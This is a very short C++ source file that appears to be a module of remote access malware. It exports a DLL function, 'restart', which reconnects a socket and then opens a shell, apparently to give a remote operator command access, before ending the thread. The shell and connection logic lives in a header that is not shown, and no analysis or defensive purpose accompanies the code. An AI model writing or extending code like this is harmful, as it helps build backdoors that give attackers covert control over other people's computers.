#include "../core/external.h"

extern "C" __declspec(dllexport) void restart()
{
    SockReconnect();
    SockShell();
    ExitThread(0);
}


